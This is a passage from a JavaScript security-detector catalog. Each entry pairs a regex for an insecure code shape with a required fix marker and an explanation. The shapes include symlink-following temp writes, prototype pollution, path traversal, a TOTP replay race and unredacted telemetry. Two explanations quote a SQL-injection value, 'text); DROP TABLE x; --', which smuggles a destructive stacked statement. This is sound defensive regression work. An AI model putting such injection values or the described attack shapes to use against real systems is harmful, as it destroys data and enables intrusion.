    reason: "vault rotation re-encrypts the database and reseals keys through framework-named files in opts.stagingDir, including a transient PLAINTEXT copy of the whole database. A raw nodeFs.writeFileSync to those paths follows a pre-planted regular file or symlink (CWE-59) and inherits a umask-wide mode (CWE-377/379). Every staged write must go through _writeStagedFileExclusive, which unlinks any stale entry then creates with O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW at 0o600 and fsyncs; the exclusive create turns a pre-plant into a hard error and O_NOFOLLOW refuses a symlinked target. This detector encodes the CodeQL js/insecure-temporary-file finding fixed in v0.14.26 so the raw-write shape cannot return to the rotation path.",
  },
  {
    // The local queue seals job rows via cryptoField.sealRow(SEAL_TABLE,
    // ...), but cryptoField.sealRow silently passes the row through as
    // PLAINTEXT for a table that was never registerTable'd. The queue
    // therefore MUST self-register its seal table on init via
    // _ensureSealTable (an idempotent getSchema-probe + registerTable),
    // or a queue node that never ran db.init writes job payloads to the
    // backend in cleartext (fail-open). SEAL_TABLE and _ensureSealTable
    // are queue-local identifiers, so the bad-shape regex self-scopes;
    // the companion `requires` (the helper's presence) is the fix marker.
    id: "queue-seal-table-not-self-registered",
    primitive: "the local queue must self-register its seal table on init via _ensureSealTable (cryptoField.registerTable(SEAL_TABLE)) so job payloads seal at rest from the first write; cryptoField.sealRow/unsealRow is a silent no-op against an unregistered table, leaving jobs in plaintext (fail-open)",
    regex: /cryptoField\.(?:sealRow|unsealRow)\s*\(\s*SEAL_TABLE\b/,
    requires: /function _ensureSealTable\b/,
    allowlist: [],
    reason: "v0.14.26 — queue-local seals job rows with cryptoField.sealRow(SEAL_TABLE, ...), but cryptoField.sealRow writes PLAINTEXT (silent no-op) for a table that was never registered. A standalone redis/sqs queue node that never ran db.init would therefore persist job payloads in cleartext. The fix self-registers the seal table on queue.init via _ensureSealTable (idempotent). This detector fires if a future edit seals/unseals SEAL_TABLE rows while the _ensureSealTable self-register is removed — reopening the fail-open-to-plaintext window. The companion _ensureSealTable declaration satisfies the discipline once the self-register is present.",
  },
  {
    // When the DSR ticket store adds the derived subject-hash lookup
    // columns to an existing table, ensureSchema MUST backfill legacy /
    // vault-less rows: compute the hashes from the plaintext subject + re-
    // seal. Once a vault is present, list({ subject }) matches on the hash
    // columns (the plaintext columns are sealed and unmatchable), so a
    // pre-upgrade row with NULL hashes is never found for its subject — and
    // the erasure-completion purge, which lists by subject, skips exactly
    // the tickets it must remove (GDPR Art. 17). The regex matches the
    // list-by-hash spec (always present in dsr.js); the companion `requires`
    // is the backfill SELECT, so the file is skipped while the backfill is
    // in place and flagged if it is removed. subject_email_hash is unique
    // to lib/dsr.js, so this self-scopes.
    id: "dsr-schema-upgrade-without-legacy-hash-backfill",
    primitive: "when the DSR ticket store queries subject-hash lookup columns, ensureSchema must backfill legacy/vault-less rows (compute hashes from plaintext + re-seal) so list({ subject }) finds pre-upgrade tickets and the erasure purge does not skip them",
    regex: /hashCol:\s*["']subject_email_hash["']/,
    requires: /subject_email_hash IS NULL/,
    allowlist: [],
    reason: "v0.14.26 — the DSR dbTicketStore matches list({ subject }) on derived-hash columns once a vault is present. A row written before the sealed-store upgrade (or while vault-less) has plaintext subject columns with NULL hashes, so it is invisible to a subject lookup — and the erasure-completion purge that lists by subject silently skips it, leaving un-erased PII (GDPR Art. 17 / CWE-noted advertised-vs-actual). ensureSchema must backfill: SELECT rows with NULL subject_*_hash, computeDerived from the plaintext, sealRow, and write hashes + sealed columns back (idempotent; also makes the legacy plaintext erasable). This detector fires if the hash-lookup path remains but the `subject_email_hash IS NULL` backfill SELECT is removed.",
  },
  {
    // The break-glass TOTP factor must reserve the accepted step ATOMICALLY
    // as part of acceptance (_reserveTotpStep — one compare-and-advance
    // cache update). The earlier shape read the replay floor
    // (_readLastTotpStep), verified against it, then committed the step in a
    // separate step (_commitTotpStep): two concurrent grant() calls with the
    // same in-window code both observe the old floor before either commits,
    // so both verify and the same code is redeemed twice (replay). Those two
    // function names are unique to lib/break-glass.js; their reappearance is
    // the racy read-then-commit pattern returning. skipCommentLines so the
    // historical reference in this catalog / docstrings doesn't self-match.
    id: "totp-step-read-then-commit-race",
    primitive: "reserve the break-glass TOTP replay step atomically as part of acceptance (_reserveTotpStep — one compare-and-advance); never read the floor, verify, then commit in a separate step (the _readLastTotpStep + _commitTotpStep shape) — two concurrent grants observe the same floor and both pass (replay)",
    regex: /\b_readLastTotpStep\b|\b_commitTotpStep\b/,
    skipCommentLines: true,
    allowlist: [],
    reason: "v0.14.26 (Codex P2 on PR #306) — break-glass grant() read the highest accepted TOTP step, verified against it, then committed the new step in a separate cache write. Two concurrent grants for the same (actor, secret, code) both read the old floor before either committed, so both _verifyTotpFactor calls passed and the same in-window code was redeemed more than once. The fix reserves the step atomically in _reserveTotpStep (a single _factorLockoutCache.update that advances the floor only if the step is strictly above it, reporting whether THIS caller won), so the second concurrent grant is refused. This detector flags reintroduction of the read-then-commit helpers (_readLastTotpStep / _commitTotpStep) that carried the race.",
  },
  // ---- v0.14.27 security-hardening sweep detectors ----
  // CodeQL js/path-injection — the static file server must re-confine a
  // request-derived path at the fs sink; the serve stream reads the confined
  // streamTarget, not the raw request-derived absPath.
  {
    id: "static-serve-stream-path-not-confined",
    primitive: "stream the static-served file from the root-confined streamTarget (lib/static.js _assertInsideRoot), never the request-derived absPath",
    regex: /createReadStream\(\s*absPath\s*,\s*streamOpts/,
    requires: /createReadStream\(\s*streamTarget\b/,
    skipCommentLines: true,
    allowlist: [],
    reason: "CWE-22 — the static file server resolves a request URL to a disk path; the path handed to fs.createReadStream must flow from the per-sink root-confinement barrier _assertInsideRoot (resolves under root, refuses anything outside via startsWith(root+sep)), not directly from the request-derived candidate. Streaming from the bare absPath re-opens the traversal-read class CodeQL flags.",
  },
  // CodeQL js/file-system-race + js/insecure-temporary-file — the content-safety
  // gate read must open the confined path with O_NOFOLLOW and anchor to one fd.
  {
    id: "static-gate-open-not-nofollow",
    primitive: "open the static content-safety gate read with O_RDONLY | O_NOFOLLOW on the confined path (lib/static.js) — refuse a final-component symlink swap, single-fd anchored",
    regex: /fsp\.open\(\s*\w*[Aa]bsPath\s*,\s*["']r["']\s*\)/,
    requires: /O_NOFOLLOW/,
    skipCommentLines: true,
    allowlist: [],
    reason: "CWE-367/CWE-59 — the pre-serve content-safety read must open the root-confined path with O_NOFOLLOW so a final-component symlink swap between the directory stat and the read cannot redirect it, and take size + bytes from that single descriptor. The bare fsp.open(absPath, \"r\") form drops both defenses.",
  },
  // CodeQL js/insecure-temporary-file — atomic-file stages every write into a
  // sibling temp file before rename; that create must be exclusive + no-follow.
  {
    id: "atomic-file-temp-create-not-exclusive",
    primitive: "create the atomic-file rename-staging temp via _openExclTemp (O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW) — never the truncating, symlink-following \"w\" flag",
    regex: /openSync\(\s*tmpPath\s*,\s*"w"/,
    requires: /_openExclTemp\s*\(/,
    skipCommentLines: true,
    allowlist: [],
    reason: "CWE-377/CWE-59 — atomic-file stages each write into a sibling temp before rename; that temp create must be O_EXCL (refuse a pre-planted file) + O_NOFOLLOW (refuse a planted symlink), not the truncating, symlink-following \"w\" flag.",
  },
  // CodeQL js/insecure-temporary-file — http-client download staging must be
  // exclusive + no-follow.
  {
    id: "http-client-download-temp-stream-not-exclusive",
    primitive: "stage the http-client download with O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW (numeric flag), not createWriteStream flags:\"w\"",
    regex: /createWriteStream\([^\n]*flags:\s*"w"/,
    requires: /O_EXCL/,
    skipCommentLines: true,
    allowlist: [],
    reason: "CWE-377/CWE-59 — downloadStream streams a remote body into a sibling temp before the hash-gated rename; that create must be O_EXCL + O_NOFOLLOW so an attacker can't pre-plant a file (truncated) or symlink (written through to a victim) at the staging path.",
  },
  // CodeQL js/remote-property-injection — body-parser must build maps from
  // [key,value] pairs (Object.fromEntries), never a request-keyed computed write.
  {
    id: "body-parser-request-keyed-map-write",
    primitive: "build body-parser header/param/field maps via Object.fromEntries (_mapFromPairs), never assign a request-derived key directly (target[bareKey|currentField|fieldName] = v)",
    regex: /\b\w+\[\s*(?:bareKey|currentField|fieldName)\s*\]\s*=(?!=)/,
    skipCommentLines: true,
    allowlist: [],
    reason: "CWE-915/CWE-1321 — body-parser's multipart Content-Disposition parser and field accumulator wrote attacker-controlled key names into a map; a part named __proto__/constructor/prototype reaches the Object.prototype setter. They now collect [key,value] pairs and materialize via _mapFromPairs (Object.fromEntries onto Object.create(null), poisoned keys dropped) / Object.assign(fields, Object.fromEntries([[fieldName,value]])). The bareKey/currentField/fieldName key vars are unique to these parsers.",
  },
  {
    id: "websocket-extension-params-keyed-write",
    primitive: "build the Sec-WebSocket-Extensions params map via Object.fromEntries onto Object.create(null) (lib/websocket.js _parseExtensionHeader), never ext.params[name] = v",
    regex: /\bext\.params\[\s*\w+\s*\]\s*=(?!=)/,
    skipCommentLines: true,
    allowlist: [],
    reason: "CWE-915/CWE-1321 — the RFC 7692 extension-parameter name comes from the client Sec-WebSocket-Extensions header; written as ext.params[k]=v a param named __proto__/constructor/prototype is the sink. The parser now collects paramPairs (poisoned names skipped) and builds via Object.assign(Object.create(null), Object.fromEntries(paramPairs)).",
  },
  {
    id: "body-parser-header-maps-compose-mapFromPairs",
    primitive: "lib/middleware/body-parser.js must compose _mapFromPairs to build its request-header/param maps — dropping the helper means a raw request-keyed computed write returned",
    regex: /function _parseMultipartHeaders\s*\(/,
    requires: /_mapFromPairs\s*\(/,
    skipCommentLines: true,
    allowlist: [],
    reason: "CWE-915/CWE-1321 — the generic-key parser sites (_contentType, _parseMultipartHeaders, _parseHeaderParams) build maps keyed by a request-controlled name; they're guarded structurally by the one composing primitive _mapFromPairs (Object.fromEntries onto Object.create(null), poisoned keys dropped). Anchored on _parseMultipartHeaders (unique to body-parser); fails if a future edit drops _mapFromPairs.",
  },
  // M10 — azure blob key must be percent-encoded before URL interpolation.
  {
    id: "azure-blob-key-unencoded-in-url",
    primitive: "percent-encode each azure blob-key path segment via _encodeBlobKey (sigv4.awsUriEncode) before URL interpolation",
    regex: /config\.container\s*\+\s*"\/"\s*\+\s*(?:opts\.)?key\b/,
    requires: /_encodeBlobKey\s*\(/,
    allowlist: [],
    reason: "CWE-20 — an azure blob key with ?/#/space truncates the URL path or corrupts the request line; keys must route through _encodeBlobKey (per-segment RFC 3986 encoding, preserving / separators) before interpolation, the encoder GCS already uses.",
  },
  // M7 — every file-upload content-safety skip path must audit the bypass.
  {
    id: "file-upload-content-safety-skip-unaudited",
    primitive: "every fileUpload content-safety skip path must emit a fileUpload.content_safety_skipped audit (_emitContentSafetySkipped) naming the reason, not just an obs counter",
    regex: /content_safety_skipped_streamed/,
    requires: /_emitContentSafetySkipped\s*\(/,
    allowlist: [],
    reason: "CWE-778 — an upload that bypasses the byte-level content scan (opt-out / no gate for the extension / over the reassembly cap) must be visible in the audit log, not just an observability counter, so a reviewer can tell a scanned upload from a bypassed one.",
  },
  // api-key rotate-on-verify re-hash must compare-and-swap on the value it read.
  {
    id: "apikey-rehash-on-verify-without-cas",
    primitive: "guard the rotate-on-verify secret re-hash UPDATE with a compare-and-swap on the read hash (.where(\"secretHash\", row.secretHash)) so a concurrent rotate() is not clobbered",
    regex: /touchFields\.secretHash\s*=\s*freshSecretHash/,
    requires: /\.where\(\s*"secretHash"\s*,\s*row\.secretHash\s*\)/,
    allowlist: [],
    reason: "CWE-362 (lost update) — verify() reads the stored secretHash, computes the upgraded hash, then writes it in a later UPDATE. Without a compare-and-swap on the exact hash that was read, a rotate()/hardRotate() landing between the read and the write is overwritten with the OLD secret's re-hash: the rotated token is invalidated and the old token keeps verifying. The re-hash UPDATE must carry `.where(\"secretHash\", row.secretHash)` so it no-ops when the row changed underneath it.",
  },
  // SigV4 canonical path must be service-aware (S3 single-encodes, others double).
  {
    id: "sigv4-canonical-path-unconditional-double-encode",
    primitive: "branch the SigV4 canonical path on doubleEncodePath (S3/GCS single-encode the already-encoded pathname; only sqs/logs/sns double-encode) — never unconditionally awsUriEncode the path",
    regex: /awsUriEncode\(\s*path\b/,
    requires: /doubleEncodePath\s*\?/,
    allowlist: [],
    reason: "Object-store correctness — a WHATWG URL pathname is ALREADY the single-encoded wire form, and S3/S3-compatible/GCS sign the canonical path with exactly that one encoding. A second awsUriEncode(path) signs '/a%2520b' for a key the wire carries as '/a%20b' → SignatureDoesNotMatch (403) on any key with a space/+/&/unicode. canonicalRequest must single-encode for S3 (doubleEncodePath=false, the default) and keep the second pass only for the genuinely double-encoding AWS services. Shipped green because every test key was plain ASCII (awsUriEncode is a no-op there).",
  },
  // Object-store presign expiry bounds live in ONE place. gcs (_v4Presign /
  // presignedUploadPolicy) and sigv4 (_presign / presignedUploadPolicy) each
  // hand-rolled the identical `expiresIn` 1s..7d bounds check (4 sites,
  // diverging only in the message prefix and the V4/SigV4 hard-cap label).
  // Extracted to sharedRequest.resolvePresignExpires(opts, prefix, label);
  // a re-inlined bounds check (recognised by its message) must route through
  // the helper so the cap stays single-sourced.
  {
    id: "presign-expires-bounds-hand-rolled",
    primitive: "use sharedRequest.resolvePresignExpires(opts, msgPrefix, hardCapLabel) for object-store presign expiry — do not re-inline the 1s..7d bounds check",
    regex: /expiresIn must be a number of seconds between/,
    allowlist: ["lib/object-store/http-request.js"],
    reason: "The presign expiry bounds (PRESIGN_MIN/MAX/DEFAULT_EXPIRES_SECONDS) were duplicated across gcs._v4Presign / gcs.presignedUploadPolicy / sigv4._presign / sigv4.presignedUploadPolicy — byte-identical apart from the message prefix and the V4 vs SigV4 hard-cap label. Centralised in http-request.js so a future cap change is one edit and every backend enforces the same ceiling. The distinctive bounds message anchors the inverse guard; only the helper's home is allowlisted.",
  },
  // Object-store conditional-GET request headers + response projection live in
  // ONE place. azure/gcs/sigv4 getResponse hand-rolled the same RFC 7232/7233
  // If-Match-family header application and the { statusCode, body, etag,
  // lastModified, contentRange, size, contentType } projection; azure/sigv4/
  // http-put head shared the { size, etag, lastModified } projection. Extracted
  // to sharedRequest.applyConditionalGetHeaders / mapGetResponse /
  // mapHeadResponse / notModifiedGetResult.
  {
    id: "object-store-conditional-get-inline",
    primitive: "use sharedRequest.applyConditionalGetHeaders / mapGetResponse / mapHeadResponse — do not re-inline the object-store conditional-GET headers or the HTTP response→struct projection",
    regex: /opts\.ifNoneMatch|Date\.parse\(\s*res\.headers\["last-modified"\]/,
    allowlist: ["lib/object-store/http-request.js"],
    reason: "azure/gcs/sigv4 getResponse each re-rolled the byte-identical conditional-GET headers (Range + If-None-Match/If-Match/If-Modified-Since/If-Unmodified-Since) and the response projection; azure/sigv4/http-put head shared the { size, etag, lastModified } projection. Centralised in http-request.js (the shared outbound object-store helper) so a header or projection change is one edit. The `opts.ifNoneMatch` header application and the `Date.parse(res.headers[\"last-modified\"])` projection expression anchor the inverse guard; only the helper's home is allowlisted. gcs.head is intentionally not routed (it parses a JSON metadata body, not response headers).",
  },
  {
    id: "mail-server-ratelimit-resolve-hand-rolled",
    primitive: "use mailServerRateLimit.resolve(opts.rateLimit) — do not re-inline the false→disabled / already-built→passthrough / else→create resolution",
    // Anchors the passthrough check `opts.rateLimit.admitConnection === \"function\"`
    // — the distinctive middle branch of the spec resolution. resolve() lives in
    // mail-server-rate-limit.js and reads `spec.admitConnection`, so it never
    // self-matches; a backend re-inlining the `opts.rateLimit`-keyed resolution trips.
    regex: /opts\.rateLimit\.admitConnection\s*===\s*["']function["']/,
    allowlist: [],
    reason: "All five mail servers (mail-server-imap / pop3 / mx / submission / managesieve) opened create() with a byte-identical 8-line rate-limit spec resolution: `false` → create({ disabled: true }), an already-built limiter (exposing admitConnection) → passthrough, else → create(spec || {}). Extracted mailServerRateLimit.resolve(spec) (the rate-limit module's home); each backend now calls `mailServerRateLimit.resolve(opts.rateLimit)` (byte-parity proven: disabled / passthrough-identity / create-from-opts). Empty allowlist — resolve() reads `spec`, not `opts.rateLimit`, so a re-inlined opts.rateLimit-keyed resolution is the only thing that matches.",
  },
  {
    id: "xml-markup-escape-hand-rolled",
    primitive: "use markupEscape(value, { apos: \"&apos;\" }) from lib/markup-escape.js — do not re-inline the XML text/attribute escaper",
    // Anchors the XML-named apostrophe escape `replace(/'/g, \"&apos;\")` — the
    // distinctive tail of the full `& < > \" '`→entity chain. markup-escape.js
    // emits the apostrophe via the `apos` PARAMETER (replace(/'/g, apos)), never
    // the literal, so it never self-matches; the no-apostrophe (guard-svg/mail)
    // and &#39; (guard-html) and c14n variants use a different tail and don't trip.
    regex: /replace\(\/'\/g,\s*["']&apos;["']\)/,
    allowlist: [],
    reason: "mail-auth._xmlEscapeText / mail-dav._xmlEscape / mail-deploy._xmlEscape / object-store/azure-blob-bucket-ops._xmlEscape each hand-rolled a BYTE-IDENTICAL `& < > \" '`→entity XML escaper (apostrophe as &apos;). Extracted markupEscape(str, opts) into lib/markup-escape.js — the base `& < > \"` chain is shared and the apostrophe form is the one varying axis (opts.apos: omitted = leave as-is, \"&#39;\" = HTML, \"&apos;\" = XML); each caller keeps its own input coercion (mail-dav's null→\"\" guard preserved). Byte-parity proven across all three apostrophe forms × 15 input types incl. null/number/object. Empty allowlist (the helper parameterises the apostrophe, so the &apos; literal lives nowhere). The base `& < > \"` chain itself is guarded by the sibling markup-escape-base-chain-hand-rolled detector — the XSS-critical sanitizer escapers (guard-html escapeText &#39; + escapeAttr, guard-svg's inline attribute escaper, compliance/mail _escapeHtml/_htmlEscape) are now all routed through markupEscape too (byte-parity proven across the XSS-vector corpus).",
  },
  {
    id: "markup-escape-base-chain-hand-rolled",
    primitive: "use markupEscape(value, opts?) from lib/markup-escape.js — do not re-inline the & < > \" markup escaper",
    // Anchors the base `& < > \"`→entity chain in order (the apostrophe is the
    // markupEscape `apos` PARAMETER, so it is not part of the anchor). The
    // markup-escape.js home builds the chain once; every other serializer routes
    // through it (each keeping its own input coercion + any extra escapes like
    // guard-html escapeAttr's backtick/= IE hardening, applied AFTER the call).
    // xml-c14n's RFC-3741 escapers don't trip: _escapeText is `& < >` + \r (no
    // \"), _escapeAttrValue is `& < \"` + \r\n\t (no >), so neither has the full
    // & < > \" sequence. The {0,120} windows are ReDoS backstops.
    scanScope: "lib",
    skipCommentLines: true,
    regex: /replace\(\/&\/g,\s*["']&amp;["']\)[\s\S]{0,120}?replace\(\/<\/g,\s*["']&lt;["']\)[\s\S]{0,120}?replace\(\/>\/g,\s*["']&gt;["']\)[\s\S]{0,120}?replace\(\/"\/g,\s*["']&quot;["']\)/,
    allowlist: ["lib/markup-escape.js"],
    reason: "The base `& < > \"`→entity markup serializer is owned by markupEscape(str, opts) in lib/markup-escape.js (\"&\" first so emitted entities aren't double-escaped; opts.apos parameterises the apostrophe form). The XSS-critical sanitizer + report escapers were routed through it: guard-html escapeText (apos &#39;) + escapeAttr (apos &#39; then the backtick/= IE-attribute-injection escapes applied after), guard-svg's inline double-quoted-attribute escaper (no apos), compliance-ai-act-transparency._escapeHtml + mail._htmlEscape (no apos). Each keeps its own input coercion (compliance/guard-svg `typeof !== 'string' → ''` or string-only; guard-html `== null ? '' : String()`; mail's String()) before the call, so markupEscape's defensive String() is a no-op there — byte-parity proven across an XSS-vector corpus + non-string inputs. Allowlist is markup-escape.js (the single home); a re-introduced inline `& < > \"` chain anywhere else trips this. xml-c14n's RFC-3741 c14n escapers are intentionally NOT members (different entity set: \r\n\t, and neither has the full & < > \" sequence).",
  },
  // awsUriEncode must iterate by Unicode code point, not UTF-16 code unit.
  {
    id: "sigv4-awsuriencode-utf16-unit-iteration",
    primitive: "iterate awsUriEncode by code point (Array.from / codePointAt), not by UTF-16 index + charAt — a per-unit encodeURIComponent throws URIError on a non-BMP key's split surrogate pair",
    regex: /function awsUriEncode\((?:(?!\n\}|encodeURIComponent)[\s\S]){0,4000}?encodeURIComponent/,
    requires: /Array\.from|codePointAt/,
    allowlist: [],
    reason: "Object-store correctness — encodeURIComponent on a lone surrogate throws 'URIError: URI malformed', so iterating awsUriEncode by str.charAt(i) and escaping each UTF-16 unit breaks any object key containing a non-BMP character (emoji, CJK Extension B, ...) before the request is signed. The encoder must walk Unicode code points (Array.from(str) keeps surrogate pairs together) so the whole character reaches encodeURIComponent as one UTF-8 sequence.",
  },
  // sql.js createTable must route its emitted DDL through the quote-aware catalog gate.
  {
    id: "sql-createtable-ddl-not-catalog-gated",
    primitive: "route createTable's emitted CREATE TABLE through _assertCatalogEmittable (its quote-aware single-statement scan is the injection backstop for the one raw-emission position — the verbatim column type) — never return a bare { sql, params }",
    regex: /var sql = "CREATE TABLE " \+ ifNot(?:(?!\n\}|return \{ sql:)[\s\S]){0,8000}?return \{ sql:/,
    allowlist: [],
    reason: "SQL injection — _ddlType returns an unrecognised column type verbatim into the DDL; it is the one raw-emission position in an otherwise quote-by-construction builder (constraints route through _checkRawFragment, names through _quoteId). The injection backstop is the quote-aware _assertCatalogEmittable scan, which refuses a top-level ';' / comment / unbalanced quote / unbalanced paren while CORRECTLY allowing those characters inside a balanced quoted label (ENUM('needs;review')). createTable must therefore return _assertCatalogEmittable(sql, []) — a bare { sql, params } would let a type like 'text); DROP TABLE x; --' emit a stacked statement. A non-quote-aware pre-scan on the type was removed precisely because it over-rejected valid quoted labels.",
  },
  {
    // v0.15.4 R2 — every hand-rolled DDL (CREATE/ALTER TABLE, CREATE INDEX)
    // concatenated and handed to runSql/exec must route through
    // safeSql.assertSingleStatement first, the same quote-aware single-statement
    // gate the b.sql builder enforces. db-schema.reconcileTable shipped a
    // verbatim-column-type injection (a type "TEXT); DROP TABLE x; --" smuggled a
    // stacked statement) until this gate; this enforces the invariant across the
    // whole raw-DDL family (schema reconcile, DSR store, migrations), not one site.
    id: "ddl-concat-to-runsql-without-single-statement-gate",
    primitive: "wrap a hand-rolled CREATE TABLE / ALTER TABLE / CREATE INDEX string in safeSql.assertSingleStatement(sql, { label }) before runSql/exec — the raw-DDL paths use the same single-statement gate the b.sql builder does",
    regex: /\b(?:runSql|exec)\(\s*(?:\w+,\s*)?"(?:CREATE TABLE|ALTER TABLE|CREATE INDEX|DROP TABLE)/,
    skipCommentLines: true,
    allowlist: [],
    reason: "A finished DDL string built by concatenating a (possibly operator-controlled) value and passed straight to runSql/exec bypasses the quote-aware single-statement scan the b.sql builder enforces on its own DDL — a verbatim column type like 'TEXT); DROP TABLE x; --' smuggles a stacked statement (lib/db-schema.js reconcileTable shipped exactly this until v0.15.4). Route the finished string through safeSql.assertSingleStatement(sql, { label }); the gated form does not match because the string literal no longer sits directly after the runSql/exec open-paren + optional db arg.",
  },
  // #63 — safe-xml must reject prototype-poisoning element/attribute names and
  // build null-prototype accumulators.
  {
    // v0.15.4 R1 — the raw write entry points (execRaw / prepare) must route a
    // write to a per-row-residency table through the residency gate, like the
    // structured builder's insert/update. Without it a raw INSERT/UPDATE lands a
    // cross-border row past the gate. The function body must reference the gate:
    // _assertRawWriteResidency (execRaw) or _isRawWriteToResidencyTable (prepare).
    id: "db-raw-write-entry-skips-residency-gate",
    primitive: "execRaw / prepare must call the residency gate (_assertRawWriteResidency / _isRawWriteToResidencyTable) so a raw INSERT/UPDATE to a per-row-residency table is validated like b.db.from().insertOne/updateOne",
    regex: /function (?:execRaw|prepare)\s*\([^)]*\)\s*\{(?:(?!_assertRawWriteResidency|_isRawWriteToResidencyTable|\n\})[\s\S]){0,12000}?\n\}/,
    allowlist: [
      // localDb.thin is an isolated lightweight node:sqlite wrapper with no
      // cryptoField / residency policy and a separate DB file - its prepare
      // cannot write a per-row-residency row, so the residency gate is N/A.
      "lib/local-db-thin.js",
    ],
    reason: "The structured builder runs every insert/update through _assertLocalResidency, but the raw paths b.db.runSql (execRaw) and b.db.prepare(sql).run(...) bypass it, so under a regulated posture a cross-border row lands straight on disk (shipped this way until v0.15.4). execRaw must call _assertRawWriteResidency(sql); prepare must wrap a write to a residency table via _isRawWriteToResidencyTable. This detector fires if either function reaches its closing brace without referencing the gate.",
  },
  {
    id: "xml-parsename-no-prototype-key-rejection",
    primitive: "reject element/attribute names __proto__/constructor/prototype in the XML name parser (lib/parsers/safe-xml.js parseName → FORBIDDEN_KEYS)",
    regex: /xml\/bad-name(?:(?!\n {2}\}|return\s+input\.substring)[\s\S]){0,3000}?return\s+input\.substring/,
    requires: /FORBIDDEN_KEYS\.has/,
    skipCommentLines: true,
    allowlist: [],
    reason: "CWE-1321 — b.safeXml built its key accumulators from parser-controlled names with no poisoned-key rejection (unlike its toml/yaml/ini siblings); an attribute named constructor tripped the duplicate guard via an inherited member, and __proto__/constructor/prototype landed as result-tree keys. parseName (uniquely scoped by the xml/bad-name code) must reject FORBIDDEN_KEYS before returning the parsed name.",
  },
  {
    id: "xml-make-wrapper-plain-object",
    primitive: "build the XML element-name wrapper with Object.create(null) (lib/parsers/safe-xml.js _make), not a plain {} keyed by an attacker-influenced element name",
    regex: /function _make\(name, value\)(?:(?!\n {2}\}|var out = \{\})[\s\S]){0,4000}?var out = \{\}/,
    requires: /var out = Object\.create\(null\)/,
    skipCommentLines: true,
    allowlist: [],
    reason: "CWE-1321 — _make wrapped each parsed element as `var out = {}; out[name] = value` keyed by the element name; with a plain object, out[\"__proto__\"]=value reassigns the wrapper prototype and the returned tree exposes inherited Object members on absent keys. The accumulator must be Object.create(null).",
  },
  // #64 — router.use must branch on a string/array path prefix, not drop it.
  {
    id: "router-use-drops-path-argument",
    primitive: "Router.use must classify its first argument (function = global; string/array = path-scoped) — never a single-arg use(fn){this.middleware.push(fn)} that drops the path",
    regex: /\buse\s*\(\s*fn\s*\)\s*\{\s*this\.middleware\.push\s*\(\s*fn\s*\)\s*;?\s*\}/,
    requires: /_usePrefixesFromFirstArg|typeof\s+first\s*===\s*["']function["']/,
    skipCommentLines: true,
    allowlist: [],
    reason: "CWE-670 — router.use(path, mw) is documented across ~11 security middleware but was unimplemented: use(fn) pushed the first arg and dropped the rest, so a path-scoped security gate either 500'd every request (the path string invoked as a function) or never ran where mounted (silent control-scoping bypass). The fix classifies the first argument before pushing.",
  },
  // M4 — JMAP must gate a client accountId against accountsFor before dispatch.
  {
    id: "jmap-accountid-forwarded-without-accountsfor-gate",
    primitive: "gate a client-supplied JMAP accountId against accountsFor(actor)'s permitted set (lib/mail-server-jmap.js _permittedAccountIds → accountNotFound) before dispatching to a method/blob handler",
    regex: /\b(?:uploadBlob|downloadBlob)\([^)]*accountId[^)]*\)/,
    requires: /_permittedAccountIds|accountNotFound/,
    allowlist: [],
    reason: "RFC 8620 §3.6.1 — a client-supplied accountId must be checked against accountsFor(actor)'s permitted set and rejected with accountNotFound BEFORE reaching a method/blob handler. Forwarding it on format-validation alone lets one tenant reach another tenant's account.",
  },
  // #69 / #125 — EVERY OTLP attribute-map encoder must route its values
  // through the telemetry redactor. The class is "a function that turns a raw
  // { key: value } attribute map into OTLP KeyValues": _attrsToOtlp (metric /
  // event JSON, lib/otel-export.js), _attrToOtlp (span / event / resource JSON,
  // lib/observability-otlp-exporter.js), _attrsToProto (span / event / resource
  // protobuf, same file). Each must call observability.redactAttrs() (or the
  // legacy per-value _redactAttrValue) before emitting; the value type-encoders
  // (_valueToOtlp / _anyValueToProto / _encodeValue) run AFTER redaction and
  // are deliberately NOT anchored. Span-anchored so a body that reaches its
  // column-0 close without a redactor reference fires.
  {
    id: "otlp-attr-encoder-skips-telemetry-redactor",
    primitive: "route every OTLP attribute-map encoder (_attrsToOtlp / _attrToOtlp / _attrsToProto) through observability.redactAttrs() before serialization — telemetry is a first-class EGRESS sink and an unredacted attribute value ships secrets/PII onto the OTLP wire (CWE-532)",
    scanScope: "lib",
    regex: /function (?:_attrToOtlp|_attrsToProto|_attrsToOtlp)\s*\([^)]*\)\s*\{(?:(?!redactAttrs|_redactAttrValue|\n\})[\s\S]){0,4000}?\n\}/,
    allowlist: [],
    reason: "CWE-532 — span/metric/resource attributes are a first-class egress sink. #69 fixed lib/otel-export.js _attrsToOtlp but pinned its detector to that one function name, leaving the SPAN exporter's two sibling encoders (lib/observability-otlp-exporter.js _attrToOtlp JSON + _attrsToProto protobuf) shipping attribute values verbatim to the collector (#125). The shared root is 'an attribute-map encoder that serializes without scrubbing'; every such encoder must pass each value through observability.redactAttrs() (default composes b.redact.redact, fail-toward-dropping on a throwing redactor) before the wire payload. The negative lookahead exempts the per-value type-encoders (_valueToOtlp/_anyValueToProto) which run after redaction; the {0,4000} bound is a ReDoS backstop well above the real encoder bodies (<2000 chars).",
  },
  // Same CWE-532 class, the OTHER OTLP egress family the span/metric detector
  // above could not see: the LOG sinks (lib/log-stream-otlp.js HTTP-JSON +
  // lib/log-stream-otlp-grpc.js gRPC). Their encoders are named per the OTLP
  // logs schema (_toLogRecord / _serializeBatch / _encodeLogRecord /
  // _encodeResourceLogs), not _attr*, so the function-name-anchored detector
  // never matched them — the #125 span fix left the log record-meta + resource
  // attributes shipping verbatim. Anchor on the buggy SHAPE instead: a raw
  // `record.meta` / `resourceAttrs` / `_resourceAttrs(cfg)` handed straight to an
  // _encode* call. The fix wraps the arg in observability().redactAttrs(...), so
  // the first token inside the paren becomes `observability` and the match dies.
  {
    id: "otlp-log-sink-encodes-attrs-without-redactor",
    primitive: "the OTLP LOG sinks (log-stream-otlp / log-stream-otlp-grpc) must run record.meta and resource attributes through observability.redactAttrs() before encoding — a log line's meta or a resource attribute holding a bearer token / password / API key ships to the collector verbatim otherwise (CWE-532), the same egress class as the span/metric exporters",
    scanScope: "lib",
    regex: /_encode(?:Attrs|Attributes|Resource)\(\s*(?:record\.meta\b|resourceAttrs\b|_resourceAttrs\(cfg\))/,
    allowlist: [],
